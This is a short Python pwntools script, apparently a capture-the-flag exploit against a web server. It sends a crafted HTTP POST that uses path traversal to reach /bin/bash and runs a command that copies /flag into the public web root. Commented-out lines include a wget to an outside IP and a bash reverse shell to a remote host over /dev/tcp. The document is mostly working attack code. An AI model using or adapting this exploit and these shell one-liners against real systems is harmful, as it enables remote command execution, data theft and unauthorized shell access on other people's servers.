from pwn import *
context.log_level=True
#p=remote('123.57.132.168', 43377)
 
p = remote('127.0.0.1',8899)

strings='''POST '''
strings+='''/..../..../..../..../..../..../..../..../..../bin/bash'''
strings+=''' HTTP/1.1
Host: 120.24.72.234
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: http://120.24.72.234:8899
Connection: close
Referer: http://120.24.72.234:8899/
Upgrade-Insecure-Requests: 1

echo `cat /flag` > ./htdocs/index.html
'''

p.sendline(str(strings))
print p.recv()
#p.recvuntil('HTTP/1.0 200 OK\r\n')
#p.sendline('/bin/bash -c "wget 120.24.72.234:8899"')
#p.sendline('bash -c "bash -i >& /dev/tcp/119.91.104.28/20003 0>&1"')
p.interactive()